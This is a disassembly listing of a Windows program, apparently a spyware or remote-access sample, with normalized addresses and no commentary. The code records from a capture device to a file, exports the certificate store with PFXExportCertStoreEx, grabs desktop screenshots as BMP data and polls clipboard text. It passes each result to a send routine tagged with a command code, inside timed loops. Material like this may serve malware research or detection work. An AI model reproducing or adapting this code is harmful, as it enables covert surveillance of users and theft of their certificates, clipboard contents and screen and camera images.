push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x51 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_4010a3
mov al [ ebp - 0x51 ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x2
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
push 0x0
push [ ebp - 0x3c ]
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x52 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_4010a3
mov al [ ebp - 0x52 ]
jmp r-xdata
push 0x0
push [ ebp - 0x3c ]
call [ rw-data ]
mov [ ebp - 0x53 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_4010a3
mov al [ ebp - 0x53 ]
and [ ebp - 0x44 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x44 ]
cmp ecx [ eax ]
jae r-xdata
mov eax [ ebp - 0x44 ]
imul eax eax 0x214
mov ecx [ ebp - 0x34 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
add eax 0x8
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push [ ebp - 0x1c ]
push [ ebp - 0x3c ]
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
jmp r-xdata
and [ ebp - 0x50 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x44 ]
inc eax
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x50 ]
cmp ecx [ eax ]
jae r-xdata
mov eax [ ebp - 0x50 ]
imul eax eax 0x204
mov ecx [ ebp - 0x38 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x18 ] eax
and [ ebp - 0x40 ] 0x0
and [ ebp - 0x30 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x5
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x18 ]
add eax 0x200
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push [ ebp - 0x18 ]
push [ ebp - 0x48 ]
push [ ebp - 0x3c ]
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x200 ]
or eax 0x4
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x200 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
push [ eax + 0x200 ]
lea ecx [ ebp - 0x2c ]
call sub_410af3
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
call sub_410af3
push 0x1
push [ ebp - 0x40 ]
lea ecx [ ebp - 0x2c ]
call sub_40132c
lea ecx [ ebp - 0x2c ]
call sub_401000
push eax
push 0x0
push 0x64
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80399101
lea ecx [ ebp - 0x2c ]
call sub_401000
push eax
lea ecx [ ebp - 0x2c ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x50 ] eax
sub_41ebe3
push ebp
mov ebp esp
push 0xffffffff
push sub_423a9c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x23c
lea ecx [ ebp - 0x224 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x234 ] 0x0
and [ ebp - 0x230 ] 0x0
and [ ebp - 0x238 ] 0x0
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
inc eax
je r-xdata
mov [ ebp - 0x23d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x23d ]
jmp r-xdata
mov [ ebp - 0x243 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x243 ]
and [ ebp - 0x23c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ ebp - 0x23c ] 0x5
jge r-xdata
push 0x36ee80
call [ Sleep@IAT ]
jmp r-xdata
push 0x1
call [ GetDesktopWindow@IAT ]
push eax
push 0xf0
push 0x140
push 0x0
push 0x0
push 0x40000000
push r--data
call [ rw-data ]
mov [ ebp - 0x210 ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x40a
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0x0
jne r-xdata
mov [ ebp - 0x23e ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x23e ]
jmp r-xdata
push 0x1
push 0x100
lea edx [ ebp - 0x20c ]
mov ecx [ ebp + 0x8 ]
call sub_415b6c
movzx eax al
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x40b
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push [ ebp - 0x210 ]
call [ DestroyWindow@IAT ]
mov [ ebp - 0x23f ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x23f ]
jmp r-xdata
push 0x0
push 0x1
push 0x435
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push 0x0
push 0x1
push 0x432
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push 0x0
push 0x0
push 0x43d
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
push 0x0
push 0x47d
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push 0x0
push 0x0
push 0x40b
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push [ ebp - 0x210 ]
call [ DestroyWindow@IAT ]
lea eax [ ebp - 0x234 ]
push eax
lea edx [ ebp - 0x20c ]
mov ecx [ ebp + 0x8 ]
call sub_411c0c
movzx eax al
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x40b
push [ ebp - 0x210 ]
call [ SendMessageW@IAT ]
push [ ebp - 0x210 ]
call [ DestroyWindow@IAT ]
mov [ ebp - 0x240 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x240 ]
jmp r-xdata
push 0x0
lea edx [ ebp - 0x20c ]
mov ecx [ ebp + 0x8 ]
call sub_411abb
mov [ ebp - 0x214 ] eax
cmp [ ebp - 0x214 ] 0x0
jne r-xdata
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x241 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x241 ]
jmp r-xdata
cmp [ ebp - 0x234 ] 0x300000
jbe r-xdata
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x242 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x224 ]
call sub_4010a3
mov al [ ebp - 0x242 ]
jmp r-xdata
mov eax [ ebp - 0x234 ]
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x248 ] 0x300000
jmp r-xdata
mov eax [ ebp - 0x23c ]
inc eax
mov [ ebp - 0x23c ] eax
mov eax [ ebp - 0x248 ]
mov [ ebp - 0x238 ] eax
push 0x1
push [ ebp - 0x238 ]
lea ecx [ ebp - 0x224 ]
call sub_4105e1
push [ ebp - 0x238 ]
lea ecx [ ebp - 0x224 ]
call sub_40100f
push eax
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
mov edx [ ebp - 0x214 ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x224 ]
call sub_401000
push eax
push 0x0
push 0x28
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x77447801
lea ecx [ ebp - 0x224 ]
call sub_401000
push eax
lea ecx [ ebp - 0x224 ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
lea ecx [ ebp - 0x224 ]
call sub_4106f0
push 0x493e0
call [ Sleep@IAT ]
jmp r-xdata
sub_41efdc
push ebp
mov ebp esp
push 0xffffffff
push sub_423ae6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
lea ecx [ ebp - 0x24 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
push r--data
push 0x10000
push 0x0
push 0x10001
push 0xa
call [ CertOpenStore@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ ebp - 0x39 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
call sub_4010a3
mov al [ ebp - 0x39 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0x0
push 0x4
push 0x0
push r--data
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ PFXExportCertStoreEx@IAT ]
test eax eax
je r-xdata
push 0x2
push [ ebp - 0x28 ]
call [ CertCloseStore@IAT ]
lea ecx [ ebp - 0x24 ]
call sub_4106f0
push 0x1
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
call sub_4105e1
lea ecx [ ebp - 0x24 ]
call sub_40100f
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
jb r-xdata
push 0x4
push 0x0
push r--data
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ PFXExportCertStoreEx@IAT ]
test eax eax
je r-xdata
push 0x77010101
lea ecx [ ebp - 0x38 ]
call sub_410af3
push r--data
lea ecx [ ebp - 0x38 ]
call sub_401345
push r--data
lea ecx [ ebp - 0x38 ]
call sub_401345
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
call [ GetACP@IAT ]
push eax
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x3
lea ecx [ ebp - 0x38 ]
call sub_410af3
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x38 ]
call sub_410af3
push 0x0
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
call sub_40100f
push eax
lea ecx [ ebp - 0x38 ]
call sub_410811
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_410af3
lea ecx [ ebp - 0x38 ]
call sub_401000
push eax
lea ecx [ ebp - 0x38 ]
call sub_410ad8
lea ecx [ ebp - 0x38 ]
call sub_401000
push eax
push 0x0
push 0x64
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80701201
lea ecx [ ebp - 0x38 ]
call sub_401000
push eax
lea ecx [ ebp - 0x38 ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
sub_41f1c9
push ebp
mov ebp esp
push 0xffffffff
push sub_423af8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
lea ecx [ ebp - 0x6c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xa4 ] 0x0
and [ ebp - 0x90 ] 0x0
and [ ebp - 0x88 ] 0x0
call [ GetProcessWindowStation@IAT ]
mov [ ebp - 0x28 ] eax
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0xc
lea eax [ ebp - 0x7c ]
push eax
push 0x1
push [ ebp - 0x28 ]
call [ GetUserObjectInformationW@IAT ]
call [ GetDesktopWindow@IAT ]
mov [ ebp - 0x84 ] eax
call [ GetDesktopWindow@IAT ]
mov [ ebp - 0x84 ] eax
push [ ebp - 0x84 ]
call [ GetDC@IAT ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x84 ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x58 ] eax
push [ ebp - 0x80 ]
call [ CreateCompatibleDC@IAT ]
mov [ ebp - 0x5c ] eax
push [ ebp - 0x58 ]
push [ ebp - 0x20 ]
push [ ebp - 0x80 ]
call [ CreateCompatibleBitmap@IAT ]
mov [ ebp - 0x70 ] eax
push [ ebp - 0x70 ]
push [ ebp - 0x5c ]
call [ SelectObject@IAT ]
push 0x40cc0020
push 0x0
push 0x0
push [ ebp - 0x80 ]
push [ ebp - 0x58 ]
push [ ebp - 0x20 ]
push 0x0
push 0x0
push [ ebp - 0x5c ]
call [ BitBlt@IAT ]
push 0x0
call [ GetDC@IAT ]
mov [ ebp - 0xa4 ] eax
push 0x2c
push 0x0
lea eax [ ebp - 0x54 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x54 ] 0x28
push 0x0
lea eax [ ebp - 0x54 ]
push eax
push 0x0
push 0x0
push 0x0
push [ ebp - 0x70 ]
push [ ebp - 0xa4 ]
call [ GetDIBits@IAT ]
cmp [ ebp - 0x40 ] 0x0
ja r-xdata
push 0x1
push [ ebp - 0x40 ]
lea ecx [ ebp - 0x6c ]
call sub_4105e1
and [ ebp - 0x44 ] 0x0
push 0x0
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_40100f
push eax
push [ ebp - 0x4c ]
push 0x0
push [ ebp - 0x70 ]
push [ ebp - 0xa4 ]
call [ GetDIBits@IAT ]
and [ ebp - 0x9a ] 0x0
and [ ebp - 0x98 ] 0x0
mov eax [ ebp - 0x40 ]
add eax 0x36
mov [ ebp - 0x9e ] eax
mov [ ebp - 0xa0 ] 0x4d42
mov [ ebp - 0x96 ] 0x36
push 0x0
push 0x28
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_41073a
push 0x0
push 0xe
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_41073a
lea ecx [ ebp - 0x6c ]
call sub_401000
push eax
push 0x0
push 0x28
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x79339801
lea ecx [ ebp - 0x6c ]
call sub_401000
push eax
lea ecx [ ebp - 0x6c ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jge r-xdata
cmp [ ebp - 0x80 ] 0x0
je r-xdata
push [ ebp - 0xa4 ]
push 0x0
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x50 ]
imul eax [ ebp - 0x4c ]
movzx ecx [ ebp - 0x46 ]
add ecx 0x7
imul eax ecx
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4c ]
neg eax
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push [ ebp - 0x80 ]
push [ ebp - 0x84 ]
call [ ReleaseDC@IAT ]
cmp [ ebp - 0x70 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
call [ DeleteDC@IAT ]
push [ ebp - 0x28 ]
call [ SetProcessWindowStation@IAT ]
push [ ebp - 0x8c ]
call [ SetThreadDesktop@IAT ]
cmp [ ebp - 0x90 ] 0x0
je r-xdata
push [ ebp - 0x70 ]
call [ DeleteObject@IAT ]
cmp [ ebp - 0x88 ] 0x0
je r-xdata
push [ ebp - 0x90 ]
call [ CloseWindowStation@IAT ]
lea ecx [ ebp - 0x6c ]
call sub_4106f0
mov [ ebp - 0xa5 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x6c ]
call sub_4010a3
mov al [ ebp - 0xa5 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x88 ]
call [ CloseDesktop@IAT ]
sub_41f4aa
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn
push [ ebp + 0x8 ]
call sub_41f1c9
pop ecx
push 0x36ee80
call [ Sleep@IAT ]
jmp r-xdata
xor eax eax
inc eax
je r-xdata
sub_41f4cc
push ebp
mov ebp esp
sub esp 0x18
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x14 ] 0x0
mov al 0x1
leave
retn
call [ GetForegroundWindow@IAT ]
push eax
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
push 0x7530
call [ Sleep@IAT ]
jmp r-xdata
push 0xd
call [ GetClipboardData@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
inc eax
je r-xdata
call [ CloseClipboard@IAT ]
push [ ebp - 0xc ]
call [ GlobalLock@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0xc ]
call [ GlobalUnlock@IAT ]
push [ ebp - 0x10 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1 ] 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
shl eax 0x1
push eax
push 0x0
push 0x28
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x74447101
mov eax [ ebp - 0x18 ]
shl eax 0x1
push eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_41578c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
push 0x0
mov edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x0
sub_41f5d0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_41f670
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_41f6d8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_41f70f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41f761
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421181
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41f797
push esi
cld
mov esi [ esp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_409038
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ esp + 0x24 ]
push [ esi + 0x10 ]
push [ esp + 0x24 ]
call sub_421181
add esp 0x20
pop esi
retn
sub_41f7c7
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_41f89c
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_405021
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_41f89c
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_409038
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_421181
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41f7c7
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41f70f
pop ebx
leave
retn
sub_41f939
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_405b42
call sub_405b42
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_41f9d4
call sub_405021
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_41f9f5
push esi
call sub_405021
mov esi [ esp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_405021
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_405021
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
pop esi
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
jmp sub_405b42
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
pop esi
retn
mov eax ecx
sub_41fa41
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41f797
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_421270
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41fa9f
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_403014
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4031ad
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_409d83
test eax eax
movsx eax [ esi ]
push eax
call sub_4031ad
cmp eax 0x78
pop ecx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
